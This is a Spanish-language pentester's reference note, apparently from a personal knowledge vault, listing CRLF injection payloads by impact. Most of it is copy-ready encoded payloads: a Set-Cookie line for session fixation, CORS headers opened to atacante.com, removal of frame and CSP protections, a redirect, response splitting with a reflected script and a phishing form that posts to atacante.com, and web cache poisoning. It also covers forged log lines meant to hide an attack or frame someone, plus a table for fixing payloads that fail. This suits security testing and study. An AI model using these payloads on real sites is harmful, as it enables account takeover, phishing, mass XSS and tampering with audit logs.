---
tipo: meta
aliases:
  - payloads CRLF
  - response splitting payloads
  - CRLF a XSS
tags:
  - meta/referencia
  - dominio/web
---

# CRLF impacto - matriz de referencia

> [!info] Referencia pura, no un zettel
> Qué inyectar una vez que el `\r\n` pasa. Cómo hacerlo pasar está en [[CRLF inyección - matriz de referencia]]; el criterio, en las dos notas de `600-tradecraft/`.

Todos los payloads llevan el `\r\n` como `%0d%0a`; ajustar la codificación según [[CRLF inyección - matriz de referencia]] § 2.

## 1. Inyección de una cabecera

Ver [[CRLF - inyección de cabecera]].

**Fijación de sesión** — fijar una cookie conocida:
```
%0d%0aSet-Cookie:%20sessionid=ATACANTE_CONOCIDO
```
Después la víctima usa esa sesión, que el atacante conoce → [[CWE-384 - Session Fixation]].

**Aflojar CORS** — habilitar el robo cruzado:
```
%0d%0aAccess-Control-Allow-Origin:%20https://atacante.com%0d%0aAccess-Control-Allow-Credentials:%20true
```
→ [[CORS - reflejo del origen con credenciales]].

**Desactivar defensas del navegador:**
```
%0d%0aX-Frame-Options:%20ALLOWALL
%0d%0aContent-Security-Policy:%20
```

**Redirección** — si el input cae antes del destino en `Location`:
```
%0d%0aLocation:%20https://atacante.com
```

## 2. División de respuesta — cuerpo completo

Ver [[CRLF - división de respuesta]]. El doble `\r\n` cierra las cabeceras y empieza el cuerpo.

**XSS reflejado**, con la respuesta legítima cortada por `Content-Length: 0`:
```
%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<script>alert(document.domain)</script>
```

Desglosado:
- `Content-Length: 0` → termina la respuesta original vacía.
- `HTTP/1.1 200 OK` → empieza una respuesta nueva.
- `Content-Type: text/html` + cuerpo → el navegador renderiza el HTML.

**Página de phishing** en el dominio legítimo:
```
%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<form action=https://atacante.com>...</form>
```

## 3. Envenenamiento de caché

Si hay caché delante, la respuesta partida se guarda y se sirve a todos. Cruza con [[MOC - Web cache]]:

- Partir la respuesta de un recurso cacheable con un cuerpo de XSS.
- La caché guarda el XSS y lo sirve a cada víctima que pida el recurso.

> [!danger] Envenenar la caché afecta a usuarios reales
> Igual que en [[Web cache - envenenamiento por entrada sin clave]]: usar cache buster mientras se prueba, y solo envenenar la entrada real de forma acordada.

## 4. Inyección de registros

El `\r\n` en un valor que se registra permite falsificar líneas de log:
```
usuario%0d%0a2026-01-01 00:00:00 INFO Login exitoso: admin
```
Inserta una entrada de log falsa. Sirve para **ocultar** el ataque real entre líneas falsas, o para incriminar. Es la técnica que ataca la capa defensiva directamente — ver la nota en [[MOC - CRLF injection]].

## 5. Qué apuntar, en orden de impacto

| Objetivo | Payload | Impacto |
|---|---|---|
| Cuerpo de respuesta (split) | § 2 | XSS sin sink, o phishing |
| Caché + split | § 3 | XSS masivo y persistente |
| `Set-Cookie` | § 1 | Fijación de sesión → toma de cuenta |
| CORS | § 1 | Robo de datos cruzado |
| `Location` | § 1 | Redirección abierta |
| Log | § 4 | Ocultar el ataque / falsificar |

## 6. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| La cabecera inyectada aparece pero el split no | Filtra el doble `\r\n`; queda solo inyección de cabecera |
| El cuerpo inyectado sale pegado a basura | Falta el `Content-Length: 0` que corta el original |
| El navegador no renderiza el cuerpo | Falta `Content-Type: text/html`, o el `Content-Length` no cuadra |
| El `Set-Cookie` no fija | La app fija otra cookie después; probar el nombre exacto de sesión |
| La caché no guarda | El recurso no es cacheable; buscar uno que lo sea |
| El XSS no ejecuta | La CSP lo bloquea; el split no la evade si viene por cabecera propia |

## Relacionadas

[[MOC - CRLF injection]] · [[CRLF inyección - matriz de referencia]] · [[XSS contextos - matriz de referencia]] · [[Web cache entradas sin clave - matriz de referencia]]
